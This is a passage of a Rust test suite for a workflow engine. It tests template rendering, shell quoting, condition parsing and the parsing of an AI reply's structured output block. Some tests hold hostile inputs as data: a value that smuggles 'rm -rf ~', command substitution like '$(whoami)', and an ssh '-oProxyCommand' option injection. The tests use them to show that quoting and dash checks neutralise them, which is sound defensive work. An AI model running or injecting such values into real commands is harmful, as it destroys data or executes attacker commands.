    assert_eq!(render("{{o}}", r#"{"o":{"k":1}}"#), "{\n  \"k\": 1\n}");
}

#[test]
fn missing_var_renders_empty() {
    assert_eq!(render("a{{nope.deep}}b", "{}"), "ab");
    assert_eq!(render("a{{x.y}}b", r#"{"x":null}"#), "ab");
}

#[test]
fn if_block_shows_on_truthy_and_hides_on_empty_list_and_undefined() {
    let tpl = "A{{#if list}}[{{list}}]{{/if}}B";
    assert!(render(tpl, r#"{"list":["x"]}"#).contains('['));
    assert_eq!(render(tpl, r#"{"list":[]}"#), "AB");
    assert_eq!(render(tpl, "{}"), "AB");
    assert_eq!(render("{{#if s}}yes{{/if}}", r#"{"s":"text"}"#), "yes");
    assert_eq!(render("{{#if s}}yes{{/if}}", r#"{"s":""}"#), "");
    assert_eq!(render("{{#if s}}yes{{/if}}", r#"{"s":false}"#), "");
}

#[test]
fn shell_mode_quotes_a_semicolon_rm_as_one_literal() {
    assert_eq!(
        render_shell("echo {{x}}", r#"{"x":"a'b; rm -rf ~"}"#),
        "echo 'a'\\''b; rm -rf ~'"
    );
}

#[test]
fn shell_mode_quotes_command_substitution_and_backticks() {
    assert_eq!(
        render_shell("echo {{x}}", r#"{"x":"$(whoami) `id`"}"#),
        "echo '$(whoami) `id`'"
    );
}

#[test]
fn shell_mode_leaves_literal_template_text_unquoted() {
    assert_eq!(
        render_shell("git -C {{dir}} status", r#"{"dir":"my dir"}"#),
        "git -C 'my dir' status"
    );
}

#[test]
fn shell_quote_wraps_in_single_quotes() {
    assert_eq!(shell_quote("abc"), "'abc'");
    assert_eq!(shell_quote(""), "''");
}

#[test]
fn render_does_not_follow_the_prototype_chain() {
    assert_eq!(
        render(
            "[{{inputs.toString}}][{{inputs.__proto__}}]",
            r#"{"inputs":{}}"#
        ),
        "[][]"
    );
    assert_eq!(
        render_shell("echo {{inputs.toString}}", r#"{"inputs":{}}"#),
        "echo ''"
    );
}

// The TS test passes a function value (`f: () => 1`) and expects ""; a `Json` tree cannot hold
// one, so the nearest checks are values that JSON.stringify and String() cannot print as text.
#[test]
fn render_prints_values_the_way_js_does() {
    let scope = Json::Object(
        [
            ("nan", Json::Number(f64::NAN)),
            ("inf", Json::Number(f64::INFINITY)),
            ("list", Json::Array(vec![Json::Number(f64::NAN)])),
        ]
        .into_iter()
        .collect(),
    );
    assert_eq!(
        render_template("[{{nan}}][{{inf}}][{{list}}]", &scope, false),
        "[NaN][Infinity][[\n  null\n]]"
    );
}

#[test]
fn keeps_conditionals_working_in_render_for_prompts() {
    assert_eq!(render("a{{#if c}}b{{/if}}", r#"{"c":true}"#), "ab");
}

#[test]
fn render_numbers_use_js_number_text() {
    for (n, text) in [
        ("3", "3"),
        ("-0", "0"),
        ("0.5", "0.5"),
        ("1.5e300", "1.5e+300"),
        ("1e21", "1e+21"),
        ("1e-7", "1e-7"),
        ("0.000001", "0.000001"),
        ("0.1", "0.1"),
        ("100", "100"),
        ("-12.25", "-12.25"),
        ("9007199254740993", "9007199254740992"),
        ("1.7976931348623157e308", "1.7976931348623157e+308"),
        ("5e-324", "5e-324"),
    ] {
        assert_eq!(render("{{n}}", &format!(r#"{{"n":{n}}}"#)), text, "{n}");
    }
    assert_eq!(
        render("{{n}}", &format!(r#"{{"n":[{}]}}"#, "0.30000000000000004")),
        "[\n  0.30000000000000004\n]"
    );
}

#[test]
fn render_big_whole_numbers_print_in_full_up_to_1e21() {
    // Built directly: serde_json without `float_roundtrip` can read this text one ULP off.
    let scope = Json::Object(
        [("n", Json::Number(1.2345678901234568e20))]
            .into_iter()
            .collect(),
    );
    assert_eq!(
        render_template("{{n}}", &scope, false),
        "123456789012345680000"
    );
}

#[test]
fn js_number_text_takes_the_even_digit_when_two_candidates_tie() {
    // Exact halves (…516.25): JS prints …516.2 where Rust's shortest print says …516.3.
    for (bits, text) in [
        (0xc3082d1435cb2062_u64, "-850620533269516.2"),
        (0x430993c7ecc03f22, "899920162195428.2"),
        (0x42a55b7b6ff6dc20, "11741328571246.062"),
        (0xc2e6201fa01603d4, "-194617802797086.62"),
    ] {
        assert_eq!(js_number_text(f64::from_bits(bits)), text);
    }
}

#[test]
fn render_pretty_json_matches_json_stringify() {
    let scope = r#"{"v":{"b":1,"a":[1,{"x":null},[],{}],"s":"q\"\\\n\t\u0001é /","e":[],"o":{}}}"#;
    assert_eq!(
        render("{{v}}", scope),
        "{\n  \"b\": 1,\n  \"a\": [\n    1,\n    {\n      \"x\": null\n    },\n    [],\n    {}\n  ],\n  \"s\": \"q\\\"\\\\\\n\\t\\u0001é\u{2028}/\",\n  \"e\": [],\n  \"o\": {}\n}"
    );
}

#[test]
fn render_keeps_object_key_order() {
    assert_eq!(
        render("{{o}}", r#"{"o":{"z":1,"a":2}}"#),
        "{\n  \"z\": 1,\n  \"a\": 2\n}"
    );
}

#[test]
fn render_if_truthiness_follows_js() {
    for (value, shown) in [
        ("0", false),
        ("1", true),
        ("-1", true),
        ("null", false),
        ("true", true),
        ("false", false),
        (r#""""#, false),
        (r#""0""#, true),
        (r#""false""#, true),
        ("[]", false),
        ("[0]", true),
        ("{}", true),
        (r#"{"a":1}"#, true),
    ] {
        let out = render("{{#if v}}yes{{/if}}", &format!(r#"{{"v":{value}}}"#));
        assert_eq!(out == "yes", shown, "{value}");
    }
}

#[test]
fn render_if_blocks_are_flat_and_closed_by_the_first_end_tag() {
    // No nesting: the first `{{/if}}` closes the outer block, the second is a stray variable.
    assert_eq!(
        render(
            "{{#if a}}1{{#if b}}2{{/if}}3{{/if}}",
            r#"{"a":true,"b":true}"#
        ),
        "1{{#if b}}23"
    );
    // An opener with no closer stays as text, and `{{#if x}}` is not a variable.
    assert_eq!(render("a{{#if x}}b", r#"{"x":true}"#), "a{{#if x}}b");
    // The body is non-greedy and spans lines.
    assert_eq!(
        render(
            "{{#if a}}\nx\n{{/if}}-{{#if b}}y{{/if}}",
            r#"{"a":true,"b":false}"#
        ),
        "\nx\n-"
    );
    assert_eq!(render("{{ #if a}}", r#"{"a":true}"#), "{{ #if a}}");
    assert_eq!(render("{{#if   a   }}k{{/if}}", r#"{"a":1}"#), "k");
}

#[test]
fn render_replaces_a_stray_closing_tag_with_nothing() {
    assert_eq!(render("a{{/if}}b", "{}"), "ab");
}

#[test]
fn render_shell_quotes_every_value_kind() {
    assert_eq!(
        render_shell(
            "run {{n}} {{b}} {{l}} {{missing}} {{s}}",
            r#"{"n":3,"b":false,"l":["a"],"s":"it's"}"#
        ),
        "run '3' 'false' '[\n  \"a\"\n]' '' 'it'\\''s'"
    );
}

#[test]
fn render_handles_spaces_inside_braces_and_unicode() {
    assert_eq!(
        render(
            "{{ a.b }}|{{\u{a0}c\u{a0}}}|{{é}}",
            r#"{"a":{"b":"1"},"c":"2","é":"3"}"#
        ),
        "1|2|3"
    );
}

#[test]
fn lookup_reads_own_properties_only() {
    let scope = jv(r#"{"a":{"b":[10,20],"__proto__":"own"},"s":"text","n":null}"#);
    let get = |path: &str| lookup(&scope, path).map(|v| v.into_owned());
    assert_eq!(get("a.b.1"), Some(Json::Number(20.0)));
    assert_eq!(get("a.b.length"), Some(Json::Number(2.0)));
    assert_eq!(get("a.b.2"), None);
    assert_eq!(get("a.b.01"), None);
    assert_eq!(get("a.b.-1"), None);
    assert_eq!(get("a.__proto__"), Some(Json::String("own".into())));
    assert_eq!(get("a.constructor"), None);
    assert_eq!(get("s.length"), None);
    assert_eq!(get("s.0"), None);
    assert_eq!(get("n"), Some(Json::Null));
    assert_eq!(get("n.x"), None);
    assert_eq!(get("a..b"), None);
    assert_eq!(get("missing"), None);
    assert_eq!(
        get("a.b").map(|v| v.as_array().map(Vec::len)),
        Some(Some(2))
    );
}

// ---------------------------------------------------------------------------------------------
// shell_dash_problems
// ---------------------------------------------------------------------------------------------

fn dash_scope() -> Json {
    jv(r#"{"inputs":{"host":"-oProxyCommand=x","ok":"example.com"},"x":"-x","empty":""}"#)
}

#[test]
fn dash_flags_a_value_that_starts_with_a_dash_and_would_be_read_as_an_option() {
    let problems = shell_dash_problems("ssh {{inputs.host}}", &dash_scope());
    assert_eq!(problems.len(), 1);
    assert!(problems[0].contains("{{inputs.host}}"));
    assert!(problems[0].contains("--"));
}

#[test]
fn dash_accepts_the_same_value_after_a_standalone_double_dash() {
    assert!(shell_dash_problems("git log -- {{x}}", &dash_scope()).is_empty());
    assert!(shell_dash_problems("git log --\t{{x}}", &dash_scope()).is_empty());
}

#[test]
fn dash_does_not_count_double_dash_inside_another_word_or_after_a_command_separator() {
    let scope = dash_scope();
    assert_eq!(
        shell_dash_problems("git log --format=x {{x}}", &scope).len(),
        1
    );
    assert_eq!(
        shell_dash_problems("git log -- a && ssh {{x}}", &scope).len(),
        1
    );
    assert_eq!(
        shell_dash_problems("git log -- a\nssh {{x}}", &scope).len(),
        1
    );
}

#[test]
fn dash_passes_values_that_do_not_start_with_a_dash() {
    let scope = dash_scope();
    assert!(shell_dash_problems("ssh {{inputs.ok}}", &scope).is_empty());
    assert!(shell_dash_problems("ssh {{empty}} {{missing}}", &scope).is_empty());
    assert!(shell_dash_problems("echo a-{{x}} --opt={{x}}", &scope).is_empty());
}

#[test]
fn dash_sees_through_empty_values_and_empty_quotes_glued_before_the_variable() {
    let glued = jv(r#"{"a":"","b":"-oProxyCommand=x","c":"-x"}"#);
    let n = |t: &str| shell_dash_problems(t, &glued).len();
    assert_eq!(n("ssh {{a}}{{b}}"), 1);
    assert_eq!(n("ssh ''{{b}}"), 1);
    assert_eq!(n("ssh \"\"{{b}}"), 1);
    assert_eq!(n("ssh {{a}}{{a}}{{b}}"), 1);
    // A non-empty prefix means the word does not start with a dash.
    assert_eq!(n("ssh x{{b}}"), 0);
    assert_eq!(n("ssh '-'{{b}}"), 0);
    assert_eq!(n("ssh 'a b'{{c}}"), 0);
    assert_eq!(n("ssh -- ''{{b}}"), 0);
    // Only the first variable of a word that starts with a dash is reported.
    assert_eq!(n("ssh {{c}}{{b}}"), 1);
}

#[test]
fn dash_suggests_both_remedies() {
    let problems = shell_dash_problems("ssh {{x}}", &dash_scope());
    assert!(problems[0].contains("put \"--\" before it"));
    assert!(problems[0].contains("--option={{x}}"));
    assert_eq!(
        problems[0],
        "{{x}}: the value starts with \"-\" and would be read as an option; put \"--\" before it, or use the --option={{x}} form"
    );
}

#[test]
fn dash_reports_each_offending_occurrence_once_per_occurrence() {
    assert_eq!(
        shell_dash_problems("a {{x}} b {{x}} -- {{x}}", &dash_scope()).len(),
        2
    );
}

#[test]
fn dash_follows_quotes_and_escapes_like_the_shell() {
    let scope = dash_scope();
    let n = |t: &str| shell_dash_problems(t, &scope).len();
    // Quoted text keeps separators inside the word.
    assert_eq!(n("ssh 'a; b'{{x}}"), 0);
    assert_eq!(n("ssh \"a b\" {{x}}"), 1);
    // A backslash-escaped space does not end the word.
    assert_eq!(n("ssh a\\ {{x}}"), 0);
    // `--` quoted is still `--` once the shell removes the quotes.
    assert_eq!(n("ssh '--' {{x}}"), 0);
    // A separator resets end-of-options, a closing tag is not a variable.
    assert_eq!(n("ssh -- a; ssh {{x}}"), 1);
    assert_eq!(n("ssh {{/if}}"), 0);
    // Rendered values are looked up the same way as in a template.
    assert_eq!(shell_dash_problems("x {{inputs.host}}", &jv("{}")).len(), 0);
}

// ---------------------------------------------------------------------------------------------
// eval_condition (workflowCondition.test.ts)
// ---------------------------------------------------------------------------------------------

const COND_SCOPE: &str = r#"{
    "inputs": {"name": "release", "n": 3, "flag": true},
    "dev": {"tags": ["a", "b"], "none": [], "text": "", "note": "hello world", "obj": {}}
}"#;

fn cond_ok(condition: &str, value: bool) {
    assert_eq!(
        eval_condition(condition, &jv(COND_SCOPE)),
        Ok(value),
        "{condition}"
    );
}

#[test]
fn condition_equals_on_strings() {
    cond_ok(r#"{{inputs.name}} == "release""#, true);
    cond_ok(r#"{{inputs.name}} == "other""#, false);
    cond_ok(r#""a" == "a""#, true);
}

#[test]
fn condition_not_equals_on_numbers() {
    cond_ok("{{inputs.n}} != 4", true);
    cond_ok("{{inputs.n}} != 3", false);
    cond_ok("{{inputs.n}} != 3.5", true);
    cond_ok("{{inputs.n}} == -3", false);
}

#[test]
fn condition_equals_on_booleans_and_mixed_types() {
    cond_ok("{{inputs.flag}} == true", true);
    cond_ok("{{inputs.flag}} == false", false);
    cond_ok(r#"{{inputs.n}} == "3""#, false);
}

#[test]
fn condition_contains_on_string_and_list() {
    cond_ok(r#"{{dev.note}} contains "world""#, true);
    cond_ok(r#"{{dev.note}} contains "nope""#, false);
}

#[test]
fn condition_contains_on_list() {
    cond_ok(r#"{{dev.tags}} contains "a""#, true);
    cond_ok(r#"{{dev.tags}} contains "z""#, false);
}

#[test]
fn condition_contains_with_a_missing_left_side_is_false_with_a_bad_left_side_an_error() {
    cond_ok(r#"{{dev.missing}} contains "x""#, false);
    let result = eval_condition(r#"{{inputs.n}} contains "x""#, &jv(COND_SCOPE));
    assert_eq!(
        result,
        Err(
            r#"Cannot parse condition "{{inputs.n}} contains "x"": contains needs a string or a list on the left"#
                .to_string()
        )
    );
}

#[test]
fn condition_empty_on_empty_list_and_empty_string() {
    cond_ok("{{dev.none}} empty", true);
    cond_ok("{{dev.text}} empty", true);
    cond_ok("{{dev.obj}} empty", true);
    cond_ok("{{dev.missing}} empty", true);
    cond_ok("{{dev.tags}} empty", false);
    cond_ok("{{inputs.n}} empty", false);
}

#[test]
fn condition_not_empty() {
    cond_ok("{{dev.tags}} not empty", true);
    cond_ok("{{dev.note}} not empty", true);
    cond_ok("{{dev.none}} not empty", false);
}

#[test]
fn condition_tolerates_surrounding_whitespace_and_spaces_inside_braces() {
    cond_ok(r#"  {{ inputs.name }}   ==   "release"  "#, true);
}

#[test]
fn condition_handles_escaped_quotes_and_operators_inside_strings() {
    cond_ok(r#""a == b" == "a == b""#, true);
    cond_ok(r#""say \"hi\"" == "say \"hi\"""#, true);
}

#[test]
fn condition_does_not_read_the_prototype_chain() {
    cond_ok("{{dev.constructor}} empty", true);
    cond_ok("{{inputs.toString}} empty", true);
}

#[test]
fn condition_parse_error_for_a_double_angle_operator() {
    let err = eval_condition("{{a}} >> 3", &jv(r#"{"a":1}"#)).unwrap_err();
    assert!(err.contains("{{a}} >> 3"));
}

#[test]
fn condition_rejects_and_or_trailing_text_empty_input_and_unterminated_strings() {
    let scope = jv(r#"{"a":1,"b":2}"#);
    for bad in [
        "{{a}} == 1 and {{b}} == 2",
        "{{a}} == 1 or {{b}} == 2",
        "{{a}} empty extra",
        "{{a}} ==",
        "",
        "\"abc == \"abc",
        "{{a}} == \"abc",
        "{{a}",
        "yes == yes",
    ] {
        assert!(eval_condition(bad, &scope).is_err(), "{bad:?}");
    }
}

#[test]
fn condition_eval_follows_js_strict_equality() {
    let scope = jv(
        r#"{"n":null,"z":0,"o":{"a":1,"b":2},"p":{"b":2,"a":1},"l":[1,{"k":"v"}],"m":[1,{"k":"v"}],"s":"x"}"#,
    );
    let ok = |c: &str, v: bool| assert_eq!(eval_condition(c, &scope), Ok(v), "{c}");
    // Both undefined are equal; undefined and null are not.
    ok("{{u}} == {{v}}", true);
    ok("{{u}} == {{n}}", false);
    ok("{{n}} == {{n}}", true);
    ok("{{u}} != {{n}}", true);
    // Objects and arrays compare by their JSON text, so key order matters.
    ok("{{l}} == {{m}}", true);
    ok("{{o}} == {{p}}", false);
    ok("{{o}} == {{o}}", true);
    ok("{{o}} == {{l}}", false);
    ok("{{o}} == \"x\"", false);
    ok("{{z}} == 0", true);
    ok("{{z}} == false", false);
    ok("{{s}} == {{s}}", true);
    // A list contains by the same equality.
    ok(r#"{{l}} contains 1"#, true);
    ok(r#"{{l}} contains {{m.1}}"#, true);
    ok(r#"{{l}} contains {{u}}"#, false);
    ok(r#"{{l}} contains "1""#, false);
    ok(r#"{{n}} contains "x""#, false);
    ok(r#"{{s}} contains """#, true);
    // Properties of lists work like in JS.
    ok("{{l.length}} == 2", true);
    ok("{{l.5}} empty", true);
}

#[test]
fn condition_contains_on_a_string_needs_a_string_on_the_right() {
    let scope = jv(r#"{"s":"abc"}"#);
    assert_eq!(
        eval_condition("{{s}} contains 1", &scope),
        Err(r#"Cannot parse condition "{{s}} contains 1": contains on a string needs a string on the right"#.to_string())
    );
    assert_eq!(
        eval_condition("{{s}} contains {{missing}}", &scope),
        Err(r#"Cannot parse condition "{{s}} contains {{missing}}": contains on a string needs a string on the right"#.to_string())
    );
}

#[test]
fn condition_eval_reports_the_parse_error_text_unchanged() {
    let scope = jv("{}");
    for bad in ["", "{{a}} >> 3", "{{a}} == 1 and 2", "{{a}} == \"x"] {
        assert_eq!(
            eval_condition(bad, &scope).unwrap_err(),
            condition_syntax_problem(bad).unwrap(),
            "{bad:?}"
        );
    }
}

// ---------------------------------------------------------------------------------------------
// output contract (workflowOutput.test.ts)
// ---------------------------------------------------------------------------------------------

fn out_fields() -> OrderedMap<OutputField> {
    let mut fields = OrderedMap::new();
    let mut summary = OutputField::new(OutputFieldType::String);
    summary.description = Some("One line summary".into());
    fields.insert("summary", summary);
    fields.insert("count", OutputField::new(OutputFieldType::Number));
    fields.insert("done", OutputField::new(OutputFieldType::Boolean));
    fields.insert("items", OutputField::new(OutputFieldType::List));
    fields.insert("meta", OutputField::new(OutputFieldType::Object));
    fields
}

fn one_field(name: &str, ty: OutputFieldType) -> OrderedMap<OutputField> {
    [(name, OutputField::new(ty))].into_iter().collect()
}

fn block(json: &str) -> String {
    block_with(json, OUTPUT_FENCE)
}

fn block_with(json: &str, info: &str) -> String {
    format!("```{info}\n{json}\n```")
}

fn parsed(reply: &str, fields: &OrderedMap<OutputField>) -> Result<Json, String> {
    parse_workflow_output(reply, fields).map(Json::Object)
}

#[test]
fn output_parses_the_last_block() {
    let first = block(r#"{"summary":"old","count":1,"done":false,"items":[],"meta":{}}"#);
    let last =
        block(r#"{"summary":"new","count":2,"done":true,"items":["a"],"meta":{"k":1},"extra":7}"#);
    let result = parsed(
        &format!("Intro\n{first}\nmore text\n{last}\nbye"),
        &out_fields(),
    );
    assert_eq!(
        result,
        Ok(jv(
            r#"{"summary":"new","count":2,"done":true,"items":["a"],"meta":{"k":1},"extra":7}"#
        ))
    );
}

#[test]
fn output_ignores_blocks_with_a_different_info_string() {
    let json = r#"{"summary":"x"}"#;
    let reply = format!(
        "{}\n{}",
        block_with(json, "json"),
        block_with(json, "workflow-output-extra")
    );
    assert!(parse_workflow_output(&reply, &one_field("summary", OutputFieldType::String)).is_err());
}

#[test]
fn output_fails_when_block_missing() {
    let err = parse_workflow_output("no block here", &out_fields()).unwrap_err();
    assert!(err.contains("No workflow-output block"));
    assert_eq!(err, "No workflow-output block found in the reply.");
}

#[test]
fn output_fails_on_wrong_type_and_names_field_and_expected_type() {
    let reply = block(r#"{"summary":"x","count":"3","done":true,"items":[],"meta":{}}"#);
    let err = parse_workflow_output(&reply, &out_fields()).unwrap_err();
    assert!(err.contains("count"));
    assert!(err.contains("number"));
    assert_eq!(err, r#"Field "count" must be a JSON number (number)."#);
}

#[test]
fn output_fails_on_missing_field_and_on_list_or_object_mismatches() {
    let missing = parse_workflow_output(&block(r#"{"summary":"x"}"#), &out_fields()).unwrap_err();
    assert!(missing.contains("count"));
    assert_eq!(
        missing,
        r#"Field "count" is missing; expected a JSON number (number)."#
    );
    let list = one_field("items", OutputFieldType::List);
    let object = one_field("meta", OutputFieldType::Object);
    assert!(parse_workflow_output(&block(r#"{"items":{}}"#), &list).is_err());
    assert!(parse_workflow_output(&block(r#"{"meta":[]}"#), &object).is_err());
    assert!(parse_workflow_output(&block(r#"{"meta":null}"#), &object).is_err());
}

#[test]
fn output_does_not_satisfy_a_field_from_the_prototype_chain() {
    let fields = one_field("constructor", OutputFieldType::Object);
    assert!(parse_workflow_output(&block("{}"), &fields).is_err());
    // An own `constructor` key is fine.
    assert!(parse_workflow_output(&block(r#"{"constructor":{}}"#), &fields).is_ok());
}

#[test]
fn output_fails_on_invalid_json() {
    let err = parse_workflow_output(&block("{not json"), &out_fields()).unwrap_err();
    assert!(err.contains("not valid JSON"));
    assert_eq!(err, "The workflow-output block is not valid JSON.");
}

#[test]
fn output_fails_when_the_json_is_not_an_object() {
    for body in ["[1,2]", "null", "3", "\"s\""] {
        let err = parse_workflow_output(&block(body), &out_fields()).unwrap_err();
        assert!(err.contains("JSON object"), "{body}");
    }
    assert_eq!(
        parse_workflow_output(&block("[1,2]"), &out_fields()).unwrap_err(),
        "The workflow-output block must contain a JSON object."
    );
}

#[test]
fn output_zero_fields_accepts_missing_block() {
    assert_eq!(parsed("just prose", &OrderedMap::new()), Ok(jv("{}")));
}

#[test]
fn output_zero_fields_still_validates_a_present_block() {
    assert_eq!(
        parsed(&block(r#"{"a":1}"#), &OrderedMap::new()),
        Ok(jv(r#"{"a":1}"#))
    );
    assert!(parse_workflow_output(&block("{bad"), &OrderedMap::new()).is_err());
}

#[test]
fn output_instruction_lists_each_field_name_and_type() {
    let fields = out_fields();
    let text = output_instruction(&fields);
    assert!(text.contains(OUTPUT_FENCE));
    for (name, field) in fields.iter() {
        assert!(text.contains(name.as_str()));
        let ty = match field.ty {
            OutputFieldType::String => "string",
            OutputFieldType::Number => "number",
            OutputFieldType::Boolean => "boolean",
            OutputFieldType::List => "list",
            OutputFieldType::Object => "object",
        };
        assert!(text.contains(ty));
    }
    assert!(text.contains("One line summary"));
}

#[test]
fn output_reask_carries_the_problem_and_the_contract() {
    let text = output_reask(&out_fields(), "field count must be a number");
    assert!(text.contains("field count must be a number"));
    assert!(text.contains(OUTPUT_FENCE));
    assert!(text.contains("summary"));
}

#[test]
fn output_instruction_and_reask_have_the_exact_ts_text() {
    let mut fields = OrderedMap::new();
    let mut summary = OutputField::new(OutputFieldType::String);
    summary.description = Some("One line".into());
    fields.insert("summary", summary);
    fields.insert("n", OutputField::new(OutputFieldType::Number));
    let instruction = "When you are finished, end your final reply with exactly one fenced code block whose info string is `workflow-output`.\nIt must contain a single JSON object with these fields:\n- summary (string): One line\n- n (number)\nExample shape:\n```workflow-output\n{ ... }\n```";
    assert_eq!(output_instruction(&fields), instruction);
    assert_eq!(
        output_reask(&fields, "boom"),
        format!("Your last reply did not satisfy the output contract: boom\n\nReply again with the result as one fenced code block, nothing else required.\n{instruction}")
    );
    assert_eq!(output_instruction(&OrderedMap::new()), "");
    // No fields: the reask ends with the empty instruction, i.e. a trailing newline.
    assert_eq!(
        output_reask(&OrderedMap::new(), "boom"),
        "Your last reply did not satisfy the output contract: boom\n\nReply again with the result as one fenced code block, nothing else required.\n"
    );
}

#[test]
fn output_fence_rules_follow_markdown() {
    let fields = one_field("a", OutputFieldType::Number);
    let a = |reply: &str| parsed(reply, &fields);
    let want = Ok(jv(r#"{"a":1}"#));
    // Up to three spaces of indent open and close a fence; four do not.
    assert_eq!(a("   ```workflow-output\n{\"a\":1}\n   ```"), want);
    assert!(a("    ```workflow-output\n{\"a\":1}\n```").is_err());
    // An unclosed fence runs to the end of the reply.
    assert_eq!(a("text\n```workflow-output\n{\"a\":1}\n"), want);
    assert_eq!(a("```workflow-output\n{\"a\":1}"), want);
    // A longer fence is closed only by an equal or longer one.
    assert_eq!(
        a("````workflow-output\n```\n{\"a\":1}\n````"),
        Err("The workflow-output block is not valid JSON.".to_string())
    );
    assert_eq!(
        a("````workflow-output\n{\"a\":1}\n```\n````"),
        Err("The workflow-output block is not valid JSON.".to_string())
    );
    assert_eq!(a("```workflow-output\n{\"a\":1}\n`````  \n"), want);
    // A closer cannot carry an info string, so the fence stays open.
    assert!(a("```workflow-output\n{\"a\":1}\n```x\n").is_err());
    // The info string is trimmed, a tilde fence is not recognised.
    assert_eq!(a("```  workflow-output  \n{\"a\":1}\n```"), want);
    assert!(a("~~~workflow-output\n{\"a\":1}\n~~~").is_err());
    // A fence line with a backtick in the info string is not a fence.
    assert!(a("```workflow-output`\n{\"a\":1}\n```").is_err());
    // CRLF line breaks work; only the last matching block counts.
    assert_eq!(
        a("```workflow-output\r\n{\"a\":0}\r\n```\r\n```workflow-output\r\n{\"a\":1}\r\n```\r\n"),
        want
    );
    // Output blocks inside another fence are body text, not blocks.
    assert!(a("```md\n```workflow-output\n{\"a\":1}\n```\n").is_err());
    // The last block wins even if the earlier one is the valid one.
    assert!(a("```workflow-output\n{\"a\":1}\n```\n```workflow-output\n{\"a\":\n```").is_err());
}

#[test]
fn output_requires_finite_numbers_and_exact_types() {
    let number = one_field("n", OutputFieldType::Number);
    assert!(parse_workflow_output(&block(r#"{"n":1.5}"#), &number).is_ok());
    assert!(parse_workflow_output(&block(r#"{"n":null}"#), &number).is_err());
    assert!(parse_workflow_output(&block(r#"{"n":true}"#), &number).is_err());
    let boolean = one_field("b", OutputFieldType::Boolean);
    assert!(parse_workflow_output(&block(r#"{"b":false}"#), &boolean).is_ok());
    assert!(parse_workflow_output(&block(r#"{"b":0}"#), &boolean).is_err());
    let string = one_field("s", OutputFieldType::String);
    assert!(parse_workflow_output(&block(r#"{"s":""}"#), &string).is_ok());
    assert!(parse_workflow_output(&block(r#"{"s":1}"#), &string).is_err());
    // The first problem in field order is reported, extra fields are kept.
    let err = parse_workflow_output(&block(r#"{"done":1,"count":"x"}"#), &out_fields());
    assert_eq!(
        err.unwrap_err(),
        r#"Field "summary" is missing; expected a JSON string (string)."#
    );
}

#[test]
fn output_keeps_the_key_order_of_the_reply() {
    let value = parse_workflow_output(
        &block(r#"{"z":1,"a":{"y":1,"b":2},"a":3,"m":[]}"#),
        &OrderedMap::new(),
    )
    .unwrap();
    assert_eq!(
        value.keys().map(String::as_str).collect::<Vec<_>>(),
        ["z", "a", "m"]
    );
    assert_eq!(value.get("a"), Some(&Json::Number(3.0)));
}

#[test]
fn ordered_map_push_unique_keeps_order_without_scanning() {
    let mut map: OrderedMap<i32> = OrderedMap::new();
    map.push_unique("b", 1);
    map.push_unique("a", 2);
    assert_eq!(
        map.keys().map(String::as_str).collect::<Vec<_>>(),
        ["b", "a"]
    );
    assert_eq!(map.get("a"), Some(&2));
}

#[test]
fn float_text_round_trips_through_output_render_and_conditions() {
    // 1 ULP off without serde_json's `float_roundtrip`: …654 used to come back as …656.
    let value = "212278.04741379654";
    let fields = one_field("value", OutputFieldType::Number);
    let output =
        parse_workflow_output(&block(&format!(r#"{{"value": {value}}}"#)), &fields).unwrap();
    let scope = Json::Object([("x", Json::Object(output))].into_iter().collect());
    assert_eq!(render_template("{{x.value}}", &scope, false), value);
    assert_eq!(
        render_template("{{x}}", &scope, false),
        format!("{{\n  \"value\": {value}\n}}")
    );
    let scope = jv(r#"{"x":{"v":3.401554009450023}}"#);
    assert_eq!(
        eval_condition("{{x.v}} == 3.401554009450023", &scope),
        Ok(true)
    );
    assert_eq!(
        render_template("{{n}}", &jv("{\"n\":123456789012345680000}"), false),
        "123456789012345680000"
    );
}

#[test]
fn render_leaves_many_openers_without_a_closer_as_text() {
    let text = "{{#if a}}x".repeat(2000);
    assert_eq!(render(&text, r#"{"a":true}"#), text);
    // Openers before the last closer still pair with the first closer after them.
    assert_eq!(
        render(
            "{{#if a}}1{{#if b}}2{{/if}}3{{#if a}}4",
            r#"{"a":true,"b":false}"#
        ),
        "1{{#if b}}23{{#if a}}4"
    );
}

// ---- switch ---------------------------------------------------------------------------------

/// The example with a switch `route` after `fetch`, its edges going straight to the report.
fn with_switch(fields: &str, handles: &[&str]) -> Workflow {
    let mut w = example();
    w.nodes.push(node(&format!(
        r#"{{"id":"route","type":"switch",{fields}}}"#
    )));
    w.edges.push(edge(r#"{"from":"fetch","to":"route"}"#));
    for handle in handles {
        w.edges.push(edge(&format!(
            r#"{{"from":"route","to":"report","handle":"{handle}"}}"#
        )));
    }
    w
}

const SWITCH_OK: &str = r#""value":"{{fetch.tickets}}","cases":["bug","feature"]"#;

#[test]
fn a_switch_with_cases_and_matching_handles_is_valid() {
    assert_eq!(
        validate_workflow(&with_switch(SWITCH_OK, &["bug", "feature", "default"])),
        vec![]
    );
    let mono = r#""decide":"mono","question":"Which?","cases":["bug"]"#;
    assert_eq!(validate_workflow(&with_switch(mono, &["bug"])), vec![]);
}

#[test]
fn flags_a_switch_without_cases() {
    assert!(flags(
        &with_switch(r#""value":"{{fetch.tickets}}","cases":[]"#, &["default"]),
        "at least one case"
    ));
    assert!(flags(
        &with_switch(r#""value":"{{fetch.tickets}}""#, &["default"]),
        "at least one case"
    ));
}

#[test]
fn flags_blank_duplicate_and_reserved_switch_cases() {
    let cases = |c: &str| {
        with_switch(
            &format!(r#""value":"{{{{fetch.tickets}}}}","cases":{c}"#),
            &["default"],
        )
    };
    assert!(flags(&cases(r#"["a","  "]"#), "cannot be blank"));
    assert!(flags(&cases(r#"["a",""]"#), "cannot be blank"));
    assert!(flags(&cases(r#"["a","a"]"#), "listed more than once"));
    assert!(flags(&cases(r#"["default"]"#), "reserved"));
    assert_eq!(validate_workflow(&cases(r#"["a","A"]"#)), vec![]);
}

#[test]
fn flags_a_switch_with_both_or_neither_of_value_and_decide() {
    assert!(flags(
        &with_switch(r#""cases":["a"]"#, &["a"]),
        "value or decide"
    ));
    assert!(flags(
        &with_switch(r#""value":"  ","cases":["a"]"#, &["a"]),
        "value or decide"
    ));
    assert!(flags(
        &with_switch(r#""value":"x","decide":"mono","cases":["a"]"#, &["a"]),
        "value or decide"
    ));
}

#[test]
fn flags_switch_edges_with_unknown_missing_or_repeated_handles() {
    let ok = |handles: &[&str]| with_switch(SWITCH_OK, handles);
    assert!(flags(&ok(&["bug", "other"]), "not one of its cases"));
    assert!(flags(&ok(&["true"]), "not one of its cases"));
    assert!(flags(
        &ok(&["bug", "bug"]),
        "more than one edge for handle \"bug\""
    ));
    // Reported once per handle, however many edges share it.
    let mut w = ok(&["bug", "bug", "bug"]);
    w.edges
